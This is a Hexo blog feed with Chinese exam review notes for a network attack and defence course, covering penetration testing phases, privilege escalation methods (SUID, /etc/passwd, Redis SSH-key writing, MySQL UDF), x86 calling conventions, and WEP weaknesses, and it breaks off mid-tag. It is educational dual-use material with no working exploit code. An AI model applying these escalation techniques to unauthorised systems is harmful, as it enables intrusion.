<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://singlemindedt.github.io/"/>
  <updated>2020-06-12T09:07:20.241Z</updated>
  <id>https://singlemindedt.github.io/</id>
  
  <author>
    <name>Smtsec</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>网络攻击与防御复习</title>
    <link href="https://singlemindedt.github.io/2020/06/12/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%A4%8D%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"/>
    <id>https://singlemindedt.github.io/2020/06/12/网络攻击与防御复习知识点总结/</id>
    <published>2020-06-12T05:20:08.000Z</published>
    <updated>2020-06-12T09:07:20.241Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>+++</p><p>1、Web安全</p><p>2、逆向安全</p><p>3、移动通信安全</p><h4 id="题型："><a href="#题型：" class="headerlink" title="题型："></a><strong>题型：</strong></h4><p><strong>论述题：3*10</strong></p><p>（简答题，记忆）</p><p><strong>材料分析题：20</strong></p><p>（代码相关web or  代码无关）</p><p><strong>代码分析题：20+30</strong></p><p>（20Web/30RE）</p><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C6.png" alt="6"></p><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C7.png" alt="6"></p><p>+++</p><p>Web方面代码主要考：<strong>PHP代码</strong></p><p>+++</p><h3 id="1、代码审计与渗透测试的区别和优缺点"><a href="#1、代码审计与渗透测试的区别和优缺点" class="headerlink" title="1、代码审计与渗透测试的区别和优缺点"></a>1、代码审计与渗透测试的区别和优缺点</h3><p><font color="#ff000" face="黑体" size="4">☆☆☆</font></p><table><thead><tr><th></th><th>渗透测试（威胁：来自外部入侵）</th><th>代码审计（脆弱性：系统自身、软件等问题）</th></tr></thead><tbody><tr><td>描述</td><td>模拟黑客攻击，评估目标系统安全性</td><td>查找程序中存在的不安全编码</td></tr><tr><td>测试目标</td><td>包括但不限于Web应用</td><td>基于提供的系统代码，寻找代码漏洞</td></tr><tr><td>测试产出</td><td>渗透测试报告+修复建议</td><td>代码审计报告+修复建议</td></tr><tr><td>优点</td><td>贴近实际场景，远程渗透</td><td>全面审查，贴近系统和架构，修复成本低</td></tr><tr><td>缺点</td><td>测试不全面，修复成本高</td><td>现场审计</td></tr></tbody></table><p>+++</p><h3 id="2、代码审计流程"><a href="#2、代码审计流程" class="headerlink" title="2、代码审计流程"></a>2、代码审计流程</h3><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C3.png" alt="3"></p><p>拿到源代码后，先使用工具进行整体扫面，然后对扫描结构进行人工漏洞确认，同时，进行人工安全编码审计，进而解决一些常规漏洞和逻辑漏洞。最后综合审计结构，编写并提交代码审计报告。</p><p>+++</p><h3 id="3、代码审计的通用方法"><a href="#3、代码审计的通用方法" class="headerlink" title="3、代码审计的通用方法"></a>3、代码审计的通用方法</h3><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C4.png" alt="3"></p><p>+++</p><h3 id="4、PHP代码审计：代码分析"><a href="#4、PHP代码审计：代码分析" class="headerlink" title="4、PHP代码审计：代码分析"></a>4、PHP代码审计：代码分析</h3><p><strong>（XSS、文件上传、文件包含、代码执行、CSRF等）</strong></p><p><font color="#ff000" face="黑体" size="4">反序列化漏洞☆☆☆</font></p><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C8.png" alt="6"></p><p>+++</p><p>查看渗透测试案例；</p><p>+++</p><h3 id="1、渗透测试的流程和每一步要做的工作"><a href="#1、渗透测试的流程和每一步要做的工作" class="headerlink" title="1、渗透测试的流程和每一步要做的工作"></a>1、渗透测试的流程和每一步要做的工作</h3><p>渗透测试分为<strong>七个阶段</strong>：</p><p>1、 前期交互阶段</p><p>2、 情报搜集阶段</p><p>3、 威胁建模阶段</p><p>4、 漏洞分析阶段</p><p>5、 渗透攻击阶段</p><p>6、 后渗透攻击阶段</p><p>7、 报告阶段</p><h4 id="1、前期交互阶段"><a href="#1、前期交互阶段" class="headerlink" title="1、前期交互阶段"></a>1、前期交互阶段</h4><ul><li>确定渗透测试的<strong>范围</strong>（允许测试）和<strong>目标</strong>（预期效果）</li><li>测试的类型（黑盒/白盒）</li><li>时间段、费用等</li></ul><blockquote><p>目标：</p><ul><li>列出所有漏洞</li><li>证明各种漏洞存在</li><li>测试各种事件响应</li><li>对网络、系统或应用程序漏洞的渗透模块开发</li></ul></blockquote><h4 id="2、情报搜集阶段（最重要阶段之一，40-60-）"><a href="#2、情报搜集阶段（最重要阶段之一，40-60-）" class="headerlink" title="2、情报搜集阶段（最重要阶段之一，40-60%）"></a>2、情报搜集阶段（最重要阶段之一，40-60%）</h4><ul><li>采用各种方式尽可能<strong>收集目标网络的信息</strong></li><li>大致步骤：</li></ul><p>1、 <strong>目标选择</strong>：选择攻击目标，确定攻击效果</p><p>2、 <strong>隐私收集</strong>：现场手机+外部收集</p><p>3、 <strong>踩点工作</strong>：主动和被动扫描技术</p><p>4、 <strong>验证目标的安全机制</strong>：防火墙、网络流量过滤系统、网络和主机的保护措施</p><h4 id="3、威胁建模阶段"><a href="#3、威胁建模阶段" class="headerlink" title="3、威胁建模阶段"></a>3、威胁建模阶段</h4><ul><li>模拟出对目标的威胁以及威胁的作用，根据威胁可能对目标系统产生的影响进行分类</li><li>结合信息收集阶段作出的分析，确定最佳的攻击方式</li><li>需要解决的问题：</li></ul><blockquote><p>如何攻击指定的网络？<br>        需要获取的重要信息是什么？<br>        采取什么攻击方式最合适？<br>        对目标最大的安全威胁是什么？</p></blockquote><p>(漏洞扫描工具（ Nexpose或 Metasploit Pro）可以帮助自动化的快速的完成威胁建模)</p><h4 id="4、漏洞分析阶段"><a href="#4、漏洞分析阶段" class="headerlink" title="4、漏洞分析阶段"></a>4、漏洞分析阶段</h4><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C5.png" alt="3"></p><h4 id="5、渗透攻击阶段"><a href="#5、渗透攻击阶段" class="headerlink" title="5、渗透攻击阶段"></a>5、渗透攻击阶段</h4><ul><li>渗透攻击阶段可以<strong>利用以前漏洞分析阶段的成果</strong>，是<strong>真正的攻击阶段</strong></li></ul><h4 id="6、后渗透攻击阶段"><a href="#6、后渗透攻击阶段" class="headerlink" title="6、后渗透攻击阶段"></a>6、后渗透攻击阶段</h4><ul><li>后渗透攻击阶段包括了<strong>当成功渗透攻击到对方计算机以后</strong>的很多任务，比如提权、上传和下载文件、跳板攻击等</li></ul><p>（以特定的业务系统为目标，识别岀关键基础设施，并寻找客户最有价值的资产）</p><h4 id="7、报告阶段"><a href="#7、报告阶段" class="headerlink" title="7、报告阶段"></a>7、报告阶段</h4><p>报告的主要组成部分：</p><ul><li><strong>确定</strong>目标最为<strong>重要的威胁</strong></li><li>将渗透测试得到的数据<strong>生成表格和图表</strong></li><li>对<strong>目标系统</strong>的<strong>改进建议</strong></li><li>对问题的<strong>修复方案</strong></li></ul><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C9.png" alt="6"></p><p>+++</p><p>需要用自己的语言描述；</p><p>+++</p><h3 id="1、为什么要提权？"><a href="#1、为什么要提权？" class="headerlink" title="1、为什么要提权？"></a>1、为什么要提权？</h3><p><strong>提权</strong>：利用操作系统或应用软件中的<strong>程序错误</strong>、<strong>设计缺陷</strong>或<strong>配置不当</strong>来获取受保护资源的<strong>高级访问权限</strong></p><ul><li>后渗透测试阶段，获得了目标系统<strong>低权限的Shell</strong>，对目标的<strong>某些访问依旧受限</strong></li><li>需要进行提权操作，来<strong>获得目标系统的最高权限</strong></li></ul><p>+++</p><h3 id="2、提权的方法和步骤-不同操作系统下的提权技术"><a href="#2、提权的方法和步骤-不同操作系统下的提权技术" class="headerlink" title="2、提权的方法和步骤/不同操作系统下的提权技术"></a>2、提权的方法和步骤/不同操作系统下的提权技术</h3><h4 id="1、Windows系统提权的一般步骤"><a href="#1、Windows系统提权的一般步骤" class="headerlink" title="1、Windows系统提权的一般步骤"></a>1、Windows系统提权的一般步骤</h4><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C6.png" alt="3"></p><ul><li>利用内核漏洞提权（MS13_053 etc.）</li><li>利用操作系统漏洞提权：</li></ul><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C7.png" alt="3"></p><ul><li>利用应用程序漏洞提权</li></ul><h4 id="2、Linux系统提权"><a href="#2、Linux系统提权" class="headerlink" title="2、Linux系统提权"></a>2、Linux系统提权</h4><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C8.png" alt="3"></p><ul><li>SUID程序提权</li><li>修改用户属组（文件权限配置不当）</li><li>修改/etc/ passwd</li><li>修改root用户ssh密钥</li><li>通配符提权</li><li>应用程序提权</li></ul><h4 id="3、数据库UDF提权"><a href="#3、数据库UDF提权" class="headerlink" title="3、数据库UDF提权"></a>3、数据库UDF提权</h4><p>UDF:User Defined Function</p><p>前提条件：</p><ol><li>获得root账户密码</li><li>数据库开启 plugin</li><li>数据库监听公网</li></ol><h4 id="4、Redis提权（未授权访问等漏洞）"><a href="#4、Redis提权（未授权访问等漏洞）" class="headerlink" title="4、Redis提权（未授权访问等漏洞）"></a>4、Redis提权（未授权访问等漏洞）</h4><p>Redis数据库以root权限启动，配合未授权访问漏洞，攻击者可以连接数据库并写入ssh密钥，接着就可以以root用户身份登录服务器</p><p>+++</p><h3 id="3、提权的防御"><a href="#3、提权的防御" class="headerlink" title="3、提权的防御"></a>3、提权的防御</h3><ul><li>及时打补丁</li><li>启动Web、DB服务时以低权限启动（最小权限原则）</li><li>服务只监听127.0.0.1（不要开在公网）</li></ul><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C10.png" alt="6"></p><p>+++</p><p>最后一题30分（RE，分析汇编语言代码；给出高级语言用汇编分析/给出任务要求写出汇编；课上用到的—关于堆栈方面的汇编代码）</p><p>给出汇编，说明该段代码的具体意义，如何工作；</p><p><strong>调用约定</strong>，四种常见的，<strong>堆栈的变化</strong>：根据代码画出堆栈变化情况；</p><p>（堆，不考）</p><p>+++</p><h3 id="1、字节序"><a href="#1、字节序" class="headerlink" title="1、字节序"></a>1、字节序</h3><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C9.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C29.png" alt="3"></p><p><a href="https://www.k2zone.cn/?p=1911" target="_blank" rel="noopener">函数栈&amp;EIP、EBP、ESP</a></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C31.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C30.png" alt="3"></p><ul><li><p>将ebx、exi、edi压入栈的原因：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">push esi</span><br><span class="line">push edi</span><br></pre></td></tr></table></figure><p>保存寄存器原有的值（保存在了栈上）（栈帧切换时不能破坏上一个函数中某些寄存器的值，寄存器只有一份，现在寄存器归我用，可能改变寄存器的值，导致函数返回时回不去，所以要保存原有的值。）</p></li><li><p>rep stosd 循环指令，循环ecx次（14次）往eax里填充CCCCCCCC（填C的原因：把之前的垃圾数据清空，INT3中断）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lea edi,dword ptr ss:[ebp-50]//lea取偏移地址</span><br><span class="line">mov ecx,14</span><br><span class="line">mov eax,CCCCCCCC</span><br><span class="line">rep stosd</span><br></pre></td></tr></table></figure><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C32.png" alt="3"></p></li><li><p>ds段（数据段）；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov al,byte ptr ds:[424A30]</span><br><span class="line">mov byte ptr ss:[ebp-4],al</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">..</span><br><span class="line">..</span><br></pre></td></tr></table></figure></li></ul><p>  由于无法在内存中传递数据，所以先把内存数据传入CPU，再从CPU传到内存的栈上去</p><ul><li>对字符串操作，传的是字符串的地址</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov dword ptr ss:[ebp-10],zijixu.424A38:&quot;abcde&quot;</span><br></pre></td></tr></table></figure><ul><li>异或操作</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xor eax,eax</span><br></pre></td></tr></table></figure><p>清零操作，代表<code>return 0</code>；默认函数返回值都是放在eax里，通过异或操作将返回值置零；</p><blockquote><p>为什么不用<code>mov eax,0x0</code>清零?</p><p>效率低，占内存</p></blockquote><ul><li>还原栈</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp//将</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure><ul><li>将栈顶的地址弹到EIP中</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret</span><br></pre></td></tr></table></figure><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C34.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C35.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C36.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C33.png" alt="3"></p><p>压栈ecx，此时栈顶esp就是ecx里的值，故之后打印的结果应该都是ecx的值；</p><p>+++</p><h3 id="2、汇编基础（给定代码能说明其含义）"><a href="#2、汇编基础（给定代码能说明其含义）" class="headerlink" title="2、汇编基础（给定代码能说明其含义）"></a>2、汇编基础（给定代码能说明其含义）</h3><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C37.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C38.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C39.png" alt="3"></p><p>+++</p><h3 id="3、调用约定（相关的汇编代码分析和栈的变化情况）"><a href="#3、调用约定（相关的汇编代码分析和栈的变化情况）" class="headerlink" title="3、调用约定（相关的汇编代码分析和栈的变化情况）"></a>3、调用约定（相关的汇编代码分析和栈的变化情况）</h3><p><font color="#ff000" face="黑体" size="4">☆☆☆</font></p><p><strong>栈帧</strong>：程序运行时栈中分配的内存块，专门用于特定的函数调用</p><p>栈帧的大致结构：</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C40.png" alt="3"></p><p>调用一个函数时的操作步骤：</p><ol><li>调用方将被调用函数所需参数放入到函数所采用的调用约定指定的位置</li><li>调用方将控制权转交给被调用函数（call），然后返回地址被保存到程序栈或CPU寄存器中</li><li>被调用函数为局部变量分配空间</li><li>被调用函数执行操作</li><li>被调用函数完成操作，释放局部变量的栈空间</li><li>被调用函数将控制权返还给调用方（ret）</li></ol><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C42.png" alt="3"></p><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C41.png" alt="3"></p><p>+++</p><h4 id="cdecl☆☆☆"><a href="#cdecl☆☆☆" class="headerlink" title="cdecl☆☆☆"></a>cdecl<font color="#ff000" face="黑体" size="4">☆☆☆</font></h4><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C43.png" alt="3"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add esp,10h   //相当于调用方清栈(调用方调整栈帧))（esp+10h,由于栈在内存中表现为从高地址往低地址增长，esp栈顶+16相当于压缩栈）</span><br><span class="line"></span><br><span class="line">1、先进后出。</span><br><span class="line">2、在内存中表现为从高地址往低地址增长。(从高地址压栈-&gt;低地址)</span><br><span class="line">3、栈顶esp：栈的最上方（低地址区）。</span><br><span class="line">4、栈低ebp：栈的最下方（高地址区）。</span><br></pre></td></tr></table></figure><p>+++</p><h4 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h4><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C44.png" alt="3"></p><p>打开被调用方：</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C45.png" alt="3"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">retn 10h //被调用方清栈(被调用方调整栈帧)；ret先返回到EIP，随后，相当于add esp,10h</span><br><span class="line">参数固定</span><br></pre></td></tr></table></figure><p>+++</p><h4 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h4><p>调用方：</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C46.png" alt="3"></p><p>被diao</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C47.png" alt="3"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov [ebp+var_C],edx</span><br><span class="line">mov [ebp+var_8],ecx</span><br><span class="line">//保存寄存器中的值，防止后边程序使用寄存器而改变其值</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retn 8 //被调用方清栈(被调用方调整栈帧)；ret先返回到EIP，随后，相当于add esp,8</span><br></pre></td></tr></table></figure><p>+++</p><h4 id="thiscall"><a href="#thiscall" class="headerlink" title="thiscall"></a>thiscall</h4><p>对象存在于堆上，不在栈里；</p><p>调用方：</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C48.png" alt="3"></p><p>ecx中存放当前调用的对象的指针this；</p><p>eax默认存放返回值；</p><p>被调用方：</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C49.png" alt="3"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea ecx,[ebp+var_4]//this指针获取</span><br><span class="line"></span><br><span class="line">retn 8 //被调用方清栈(被调用方调整栈帧)；ret先返回到EIP，随后，相当于add esp,8</span><br></pre></td></tr></table></figure><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C50.png" alt="3"></p><p>+++</p><h3 id="4、简单的软件保护技术举例"><a href="#4、简单的软件保护技术举例" class="headerlink" title="4、简单的软件保护技术举例"></a>4、简单的软件保护技术举例</h3><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C51.png" alt="3"></p><p>+++</p><h3 id="5、Windows的内核原理"><a href="#5、Windows的内核原理" class="headerlink" title="5、Windows的内核原理"></a>5、Windows的内核原理</h3><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C52.png" alt="3"></p><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C11.png" alt="6"></p><p>+++</p><p>发展过程中的变化；</p><p>+++</p><h3 id="1、移动网络的分类和安全风险"><a href="#1、移动网络的分类和安全风险" class="headerlink" title="1、移动网络的分类和安全风险"></a>1、移动网络的分类和安全风险</h3><p>分类：</p><p>无线局域网（WLAN）、无线个域网（WPAN）、无线体域网（WBAN）、无线城域网（WMAN）、无线广域网（WWAN）</p><p>安全风险：</p><ul><li>有线网络</li><li>无线网络</li></ul><p>+++</p><h3 id="2、WLAN安全机制—-WEP，IEEE-802-11i-WPA、WPA2、CCMP、TKIP、认证密钥交换、四步握手等"><a href="#2、WLAN安全机制—-WEP，IEEE-802-11i-WPA、WPA2、CCMP、TKIP、认证密钥交换、四步握手等" class="headerlink" title="2、WLAN安全机制—-WEP，IEEE 802.11i(WPA、WPA2、CCMP、TKIP、认证密钥交换、四步握手等)"></a>2、WLAN安全机制—-WEP，IEEE 802.11i(WPA、WPA2、CCMP、TKIP、认证密钥交换、四步握手等)</h3><h4 id="1、WEP"><a href="#1、WEP" class="headerlink" title="1、WEP"></a>1、WEP</h4><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C10.png" alt="3"></p><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C11.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C12.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C13.png" alt="3"></p><p>WEP的安全问题：</p><ul><li>RC4算法的使用（存在大量弱密钥；每256个密钥就有一个；建议：抛弃RC4输出的前256比特）</li><li>Ⅳ的使用（空间太小，生日攻击）</li><li>SK的产生与分发（无密钥交换/管理机制）</li><li>CRC32算法的使用（CRC32是线性的）</li><li>无抗重放攻击</li></ul><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C14.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C15.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C16.png" alt="3"></p><h4 id="2、IEEE-802-11i"><a href="#2、IEEE-802-11i" class="headerlink" title="2、IEEE 802.11i"></a>2、IEEE 802.11i</h4><ul><li>TSN(过度安全网络)</li><li>RSN（坚固安全网络）</li></ul><h4 id="3、WPA"><a href="#3、WPA" class="headerlink" title="3、WPA"></a>3、WPA</h4><p>802.11i草案中一部分；</p><h4 id="4、加密机制TKIP—（暂时密钥完整性协议）"><a href="#4、加密机制TKIP—（暂时密钥完整性协议）" class="headerlink" title="4、加密机制TKIP—（暂时密钥完整性协议）"></a>4、加密机制TKIP—（暂时密钥完整性协议）</h4><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C17.png" 